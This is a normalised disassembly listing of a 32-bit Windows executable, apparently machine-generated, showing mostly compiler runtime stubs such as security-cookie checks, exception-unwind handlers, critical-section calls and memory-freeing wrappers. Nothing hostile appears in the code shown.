mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40bcc4
push 0xa
call sub_41334d
pop ecx
retn
sub_40c4c9
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40119e
pop ecx
pop ecx
pop ebp
retn
sub_40c55b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409fc3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40c647
mov eax 0x1
retn
_start
call sub_406948
jmp sub_413711
sub_40c982
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40cafa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40d252
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40cd90
mov ecx [ eax + 0x4 ]
push ecx
call sub_408b16
pop ecx
retn
sub_40ce9b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40d288
call sub_4023b6
retn
sub_40d480
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_408b16
add esp 0x4
sub_40d54e
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x18 ]
call sub_405770
push 0x0
push 0x0
call sub_4037cf
int3
sub_40d6ab
push sub_407805
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
j_sub_41113d
jmp sub_41113d
sub_40dc30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_409fc3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40eaf0
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
mov [ esi ] 0x0
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40ec60
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_4117ac
pop ecx
retn
sub_40ee09
push 0xd
call sub_41334d
pop ecx
retn
sub_40ee53
push 0x1
push 0x0
push 0x0
call sub_4135a8
add esp 0xc
retn
sub_40f271
push 0x2
call sub_4103d9
sub_40ffd0
xor eax eax
inc eax
retn
sub_410010
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_410147
push 0xd
call sub_41334d
pop ecx
retn
sub_410153
push 0xc
call sub_41334d
pop ecx
retn
sub_4103d0
push 0x1
call sub_41334d
pop ecx
retn
sub_410f49
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4135a8
add esp 0xc
pop ebp
retn
sub_410f5f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_409fc3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_410f7c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_41113d
mov [ ecx ] r--data
jmp sub_4013e2
sub_4112eb
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
push eax
call sub_402000
push 0x0
push 0x0
call sub_4037cf
int3
sub_411301
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404477
add esp 0x10
pop ebp
retn
sub_41131b
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_411735
call [ TlsAlloc@IAT ]
retn 0x4
sub_41173e
mov [ ecx ] r--data
jmp sub_41113d
sub_411813
push 0xe
call sub_41334d
pop ecx
retn
sub_411b10
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
pop ebp
jmp eax
sub_4130db
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41458b
add esp 0x10
pop ebp
retn
sub_4130f5
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_403b3f
sub_413191
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40c8ea
pop ecx
pop ecx
pop ebp
retn
sub_4131a4
push sub_4018b9
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_413229
mov eax sub_40378f
mov [ rw-data ] eax
mov [ rw-data ] sub_40c4c9
mov [ rw-data ] sub_4043f3
mov [ rw-data ] sub_413191
mov [ rw-data ] sub_40b419
mov [ rw-data ] eax
mov [ rw-data ] sub_40505a
mov [ rw-data ] sub_402af2
mov [ rw-data ] sub_40119e
mov [ rw-data ] sub_40c8ea
retn
sub_413345
push ebx
call sub_40417b
pop ecx
retn
sub_41334d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_413540
push 0x0
call sub_404ac1
int3
sub_4136d3
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_41334d
pop ecx
sub_413840
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40c741
pop ecx
pop ecx
retn
sub_413854
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40abd0
push eax
call sub_410f49
sub_41386e
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_414035
retn
sub_413d26
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4148b0
sub_414035
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_414216
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_4118f8
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_414826
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_414750
add esp 0xc
pop ebp
retn 0x4
sub_414859
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_415c05
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_41488b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_414750
add esp 0xc
pop ebp
retn 0x8
sub_414996
push 0x4
mov eax sub_415fe0
call sub_411a1a
call sub_40c968
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_404d81
call sub_40ffac
sub_414a6f
mov eax [ ebp - 0x14 ]
call sub_4148db
retn
sub_415bd9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_415b10
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_415c24
call eax
retn
sub_415e01
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40b4ce
pop ecx
pop ecx
retn
sub_415e30
push 0x1
call sub_41334d
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_415fe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416000
mov eax [ ebp - 0x10 ]
push eax
call sub_408b16
pop ecx
retn
sub_41600b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416030
mov eax [ ebp - 0x10 ]
push eax
call sub_408b16
pop ecx
retn
sub_41603b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416060
mov ecx [ ebp + 0x8 ]
jmp sub_401d30
sub_416068
mov eax [ ebp - 0x14 ]
push eax
call sub_408b16
pop ecx
retn
sub_416073
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416090
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4160b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4160d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4160f0
mov eax [ ebp + 0x8 ]
jmp sub_40cd90
sub_4160f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416120
mov eax [ ebp - 0x10 ]
jmp sub_40cd90
sub_416128
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416150
mov ecx [ ebp + 0x8 ]
jmp sub_408990
sub_416158
mov eax [ ebp - 0x10 ]
jmp sub_40cd90
sub_416160
mov eax [ ebp + 0x8 ]
jmp sub_40cd90
sub_416168
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
j_sub_407c00#4
jmp sub_407c00
sub_416195
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4161b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4161d0
lea esi [ ebp - 0x34 ]
jmp sub_408a10
sub_4161d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_401400
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416200
lea esi [ ebp - 0x448 ]
jmp sub_408a10
sub_41620b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_401400
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416240
mov eax [ ebp + 0x8 ]
push eax
call sub_403730
retn
sub_41624a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416270
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416290
lea eax [ ebp - 0xd54 ]
jmp sub_401490
sub_41629b
lea eax [ ebp - 0xd38 ]
jmp sub_401490
sub_4162a6
lea eax [ ebp - 0xd34 ]
jmp sub_401490
sub_4162b1
lea eax [ ebp - 0xd30 ]
jmp sub_401490
sub_4162bc
lea eax [ ebp - 0xd50 ]
jmp sub_401490
sub_4162c7
mov eax [ ebp - 0xd9c ]
push eax
call sub_408b16
pop ecx
retn
sub_4162d5
lea edi [ ebp - 0xd9c ]
jmp sub_404430
sub_4162e0
lea edi [ ebp - 0xd44 ]
jmp sub_404430
sub_4162eb
lea eax [ ebp - 0xd2c ]
jmp sub_401490
sub_4162f6
lea edi [ ebp - 0xd48 ]
jmp sub_404430
sub_416301
lea edi [ ebp - 0xd58 ]
jmp sub_404430
sub_41630c
lea ecx [ ebp - 0xd7c ]
jmp sub_403da0
sub_416317
lea edi [ ebp - 0xd60 ]
jmp sub_404430
sub_416322
lea edi [ ebp - 0xd44 ]
jmp sub_404430
sub_41632d
lea eax [ ebp - 0xd5c ]
jmp sub_401490
sub_416338
lea edi [ ebp - 0xd4c ]
jmp sub_404430
sub_416343
mov eax [ ebp - 0xdd8 ]
push eax
call sub_408b16
pop ecx
retn
sub_416351
lea ecx [ ebp - 0xd7c ]
jmp sub_403da0
sub_41635c
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_41636a
lea edi [ ebp - 0xdb8 ]
jmp sub_404430
sub_416375
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_416383
lea edi [ ebp - 0xdcc ]
jmp sub_404430
sub_41638e
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_41639c
lea edi [ ebp - 0xdb0 ]
jmp sub_404430
sub_4163a7
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_4163b5
lea edi [ ebp - 0xdb4 ]
jmp sub_404430
sub_4163c0
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_4163ce
lea edi [ ebp - 0xdac ]
jmp sub_404430
sub_4163d9
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_4163e7
lea edi [ ebp - 0xd68 ]
jmp sub_404430
sub_4163f2
mov eax [ ebp - 0xd40 ]
push eax
call sub_408b16
pop ecx
retn
sub_416400
lea edi [ ebp - 0xd40 ]
jmp sub_404430
sub_41640b
mov eax [ ebp - 0xd2c ]
push eax
call sub_408b16
pop ecx
retn
sub_416419
lea edi [ ebp - 0xd2c ]
jmp sub_404430
sub_416424
mov eax [ ebp - 0xd94 ]
push eax
call sub_408b16
pop ecx
retn
sub_416432
lea esi [ ebp - 0xd28 ]
jmp sub_408a10
sub_41643d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xde0 ]
xor ecx eax
call sub_401400
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416470
mov ecx [ ebp + 0x8 ]
jmp sub_408990
sub_416478
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
call sub_403730
retn
sub_416485
mov esi [ ebp + 0x8 ]
add esi 0x24
jmp sub_40d480
sub_416490
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
j_sub_407c00#2
jmp sub_407c00
sub_4164b5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_4164d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
j_sub_407c00#3
jmp sub_407c00
j_sub_407c00
jmp sub_407c00
sub_4164fa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416520
lea edi [ ebp - 0xd4 ]
jmp sub_404430
sub_41652b
lea edi [ ebp - 0xd4 ]
jmp sub_404430
sub_416536
lea edi [ ebp - 0xd8 ]
jmp sub_404430
sub_416541
lea esi [ ebp - 0x34 ]
jmp sub_4077e0
sub_416549
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x100 ]
xor ecx eax
call sub_401400
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_401400
mov eax r--data
jmp sub_40c525
sub_416580
push sub_4165a0
call sub_40cafa
pop ecx
retn
sub_416590
push sub_4165e0
call sub_40cafa
pop ecx
retn
sub_4165a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
push eax
call sub_408b16
add esp 0x4
sub_4165e0
push rw-data
call [ VariantClear@IAT ]
retn
sub_4165ec
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_41113d
